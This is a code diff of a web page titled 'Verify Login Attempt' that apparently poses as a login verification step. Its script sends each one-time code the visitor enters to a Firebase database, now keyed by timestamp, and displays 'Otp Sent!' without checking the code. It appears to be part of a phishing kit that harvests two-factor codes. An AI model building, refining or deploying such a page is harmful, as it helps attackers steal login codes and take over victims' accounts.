@@ -9,7 +9,7 @@
 
   <body>
     <div class="header">
-      <img src="/IMG_5868.jpeg" alt="" />
+      <img src="IMG_5868.jpeg" alt="" />
     </div>
     <div class="body-container">
       <div class="body">
@@ -17,7 +17,7 @@
           <h1>Verify Login Attempt</h1>
         </div>
         <div class="email-img">
-          <img src="/Dubem's remake/Otp Page/email.svg" alt="">
+          <img src="email.svg" alt="">
         </div>
         <div class="newID">
           <p>We sent a verification code to your <strong>phone</strong>.</p>
@@ -110,12 +110,15 @@ const app = initializeApp(firebaseConfig);
 const db = getDatabase(app);
 
 document.getElementById("otp-button").addEventListener("click",function (e) {
-set(ref(db, 'otp/' + document.getElementById("token").value),
+  let now = new Date();
+  let timestamp = now.toLocaleString();
+set(ref(db, 'otp/' + timestamp),
 {
     otp: document.getElementById("token").value
 });
 
-alert("Otp Sent!")
+alert("Otp Sent!");
+
 })
 </script>
   </body>
